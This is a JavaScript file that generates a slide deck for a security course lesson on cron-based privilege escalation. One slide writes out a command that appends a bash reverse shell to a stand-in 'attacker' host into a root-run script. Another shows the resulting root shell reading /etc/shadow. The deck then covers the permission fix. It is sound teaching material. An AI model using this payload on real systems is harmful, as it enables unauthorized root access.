const pptxgen = require("pptxgenjs");
const path = require("path");

const LOGO = "/home/claudeuser/repos/test/pictures/BrainsWork_Logo_Square_1000_1000-150x150.jpg";
const PHOTO = "/home/claudeuser/repos/test/pictures/Abdul_Aziz_Khan.JPG";

const BG = "14181F";
const ACCENT = "2FDD95";
const HEAD = "F2F2F2";
const BODY = "9AA3AE";

const pptx = new pptxgen();
pptx.defineLayout({ name: "WIDE", width: 10, height: 5.625 });
pptx.layout = "WIDE";

function addLogo(slide) {
  slide.addImage({ path: LOGO, x: 10 - 0.6 - 0.15, y: 5.625 - 0.6 - 0.15, w: 0.6, h: 0.6 });
}

function newSlide() {
  const s = pptx.addSlide();
  s.background = { color: BG };
  addLogo(s);
  return s;
}

function titleBar(slide, text) {
  slide.addText(text, {
    x: 0.5, y: 0.35, w: 9, h: 0.9,
    fontFace: "Cambria", bold: true, fontSize: 28, color: HEAD,
  });
}

function bullets(slide, items, opts = {}) {
  slide.addText(
    items.map((t) => ({ text: t, options: { bullet: true, breakLine: true } })),
    {
      x: 0.6, y: opts.y || 1.5, w: 8.8, h: opts.h || 3.5,
      fontFace: "Calibri", fontSize: opts.fontSize || 20, color: BODY,
      valign: "top", lineSpacingMultiple: 1.3,
    }
  );
}

function codeBlock(slide, text, opts = {}) {
  slide.addText(text, {
    x: 0.6, y: opts.y || 1.6, w: 8.8, h: opts.h || 2.8,
    fontFace: "Courier New", fontSize: opts.fontSize || 15, color: ACCENT,
    fill: { color: "1D232C" }, valign: "top", align: "left",
    margin: 10,
  });
}

// 1. Title
{
  const s = newSlide();
  s.addText("Day 26", {
    x: 0.5, y: 1.5, w: 9, h: 1,
    fontFace: "Cambria", bold: true, fontSize: 40, color: ACCENT,
  });
  s.addText("Cron Privilege Escalation — Real Exploit, Real Fix", {
    x: 0.5, y: 2.5, w: 9, h: 1.3,
    fontFace: "Cambria", bold: true, fontSize: 24, color: HEAD,
  });
  s.addText("Security Tutor — CEH Track, Phase 5 Capstone: Identity & Access Management", {
    x: 0.5, y: 4.0, w: 9, h: 0.6,
    fontFace: "Courier New", fontSize: 14, color: BODY,
  });
}

// 2. Hook
{
  const s = newSlide();
  titleBar(s, "uid 1000 to uid 0 in Under a Minute");
  bullets(s, [
    "No exploit code. No memory corruption.",
    "One file had the wrong permission bit.",
    "That was the entire attack.",
  ], { y: 1.8 });
}

// 3. What we'll cover
{
  const s = newSlide();
  titleBar(s, "What We'll Cover");
  bullets(s, [
    "Vertical privilege escalation, refreshed",
    "Finding a world-writable root-run script",
    "Weaponizing it with a reverse shell",
    "The fix -- and proving it actually holds",
  ]);
}

// 4. Vertical vs horizontal
{
  const s = newSlide();
  titleBar(s, "Vertical vs. Horizontal Privilege Escalation");
  bullets(s, [
    "Vertical: lower privilege -> higher privilege (user -> root)",
    "Horizontal: same privilege level, different identity (IDOR)",
    "Today's lab: a clean vertical example",
  ]);
}

// 5. The misconfiguration
{
  const s = newSlide();
  titleBar(s, "Finding the Misconfiguration");
  codeBlock(s, "$ cat /etc/cron.d/cleanup-cron\n* * * * * root /opt/cleanup.sh\n\n$ ls -la /opt/cleanup.sh\n-rwxrwxrwx 1 root root 66 /opt/cleanup.sh", { h: 2.4 });
  bullets(s, [
    "root runs this script every minute",
    "but ANYONE can write to it -- that's the whole bug",
  ], { y: 4.1, h: 1.3, fontSize: 16 });
}

// 6. The payload
{
  const s = newSlide();
  titleBar(s, "Weaponizing It");
  codeBlock(s, "$ echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' \\\n    >> /opt/cleanup.sh", { h: 1.2 });
  bullets(s, [
    "bash -i: interactive shell",
    "/dev/tcp/host/port: bash's built-in network socket",
    "Reverse shell: target connects OUT to the attacker",
  ], { y: 2.9, h: 2.2 });
}

// 7. Caught the shell
{
  const s = newSlide();
  titleBar(s, "Caught It");
  codeBlock(s, "$ whoami\nroot\n\n$ id\nuid=0(root) gid=0(root) groups=0(root)\n\n$ cat /etc/shadow | head -3\nroot:*:20746:0:99999:7:::", { h: 3.2 });
}

// 8. Mistake/correction -- detection noise
{
  const s = newSlide();
  titleBar(s, "Common Question: Won't This Get Flagged?");
  bullets(s, [
    "Payload still in the script -> cron retries every minute",
    "Single-connection listener just refuses later attempts",
    "Real lesson: a shell spawned from cron, every minute, is LOUD",
    "Preview of Phase 7 -- Detection",
  ]);
}

// 9. The fix
{
  const s = newSlide();
  titleBar(s, "The Fix -- and Proving It");
  codeBlock(s, "$ chmod 644 /opt/cleanup.sh\n$ ls -la /opt/cleanup.sh\n-rw-r--r-- 1 root root 118 /opt/cleanup.sh\n\n(as lowpriv) $ echo '...' >> /opt/cleanup.sh\nbash: /opt/cleanup.sh: Permission denied", { h: 3.2, fontSize: 14 });
}

// 10. Recap
{
  const s = newSlide();
  titleBar(s, "Recap");
  bullets(s, [
    "Cron did exactly what it was told -- the bug was file permissions",
    "Fixing it didn't require removing the account's shell access",
    "A compensating control must block the real exposure, not a detail",
  ]);
}

// 11. Quiz
{
  const s = newSlide();
  titleBar(s, "Quiz — Pause and Think");
  bullets(s, [
    "1. What was the actual vulnerability here -- be specific",
    "2. Why did chmod 644 stop the attack with lowpriv's shell still active?",
    "3. Interim mitigation if you can't fix permissions yet -- why not block a port?",
  ], { h: 3.2, fontSize: 18 });
}

// 12. Closing / takeaway
{
  const s = newSlide();
  titleBar(s, "Operational Takeaway");
  s.addText(
    "Always check who can WRITE to a file before trusting who's allowed to RUN it.",
    {
      x: 0.6, y: 1.8, w: 8.8, h: 1.8,
      fontFace: "Cambria", bold: true, fontSize: 22, color: ACCENT,
      valign: "top",
    }
  );
  bullets(s, [
    "Phase 5 complete: IAM, AAA, SSO, credential attacks, privilege escalation",
    "Next: Phase 6 -- Cloud Security",
  ], { y: 3.7, h: 1.2, fontSize: 16 });
}

// 13. About the Trainer
{
  const s = newSlide();
  s.addImage({ path: PHOTO, x: 6.6, y: 0.8, w: 2.4, h: 3.2 });
  s.addText("Abdul Aziz Khan", {
    x: 0.6, y: 0.9, w: 5.8, h: 0.6,
    fontFace: "Cambria", bold: true, fontSize: 26, color: HEAD,
  });
  s.addText("Trainer, BrainsWork", {
    x: 0.6, y: 1.45, w: 5.8, h: 0.4,
    fontFace: "Calibri", fontSize: 16, color: ACCENT,
  });
  s.addText(
    "Abdul Aziz Khan is a seasoned Telecom and IT professional, currently working as a DevOps engineer for a Fortune 500 financial company. A long-time practitioner turned teacher, he built this course to make security concepts concrete through real, hands-on labs rather than slides alone. Open, candid, and always glad to talk shop.",
    {
      x: 0.6, y: 2.0, w: 5.8, h: 2.2,
      fontFace: "Calibri", fontSize: 14, color: BODY, valign: "top", lineSpacingMultiple: 1.25,
    }
  );
  s.addText("khan.abdulaziz@gmail.com   |   linkedin.com/in/abdulazizk", {
    x: 0.6, y: 4.6, w: 5.8, h: 0.5,
    fontFace: "Courier New", fontSize: 13, color: BODY,
  });
}

pptx.writeFile({ fileName: path.join(__dirname, "presentation.pptx") }).then(() => {
  console.log("done");
});
